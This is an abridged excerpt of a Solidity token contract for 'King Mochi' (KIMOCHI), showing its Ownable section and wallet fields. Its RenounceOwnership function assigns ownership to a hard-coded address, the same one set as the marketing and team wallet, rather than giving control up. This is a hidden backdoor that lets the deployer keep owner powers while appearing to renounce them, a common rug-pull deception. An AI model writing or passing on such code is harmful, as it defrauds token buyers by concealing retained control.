...
contract Ownable is Context {
    ...
    function RenounceOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x7cd2872737Ab2D42f9e68F90798b248a4fAe3909);
    }
...
contract KingMochi is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "King Mochi";
    string private _symbol = "KIMOCHI";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x7cd2872737Ab2D42f9e68F90798b248a4fAe3909);
    address payable public teamWalletAddress = payable(0x7cd2872737Ab2D42f9e68F90798b248a4fAe3909);
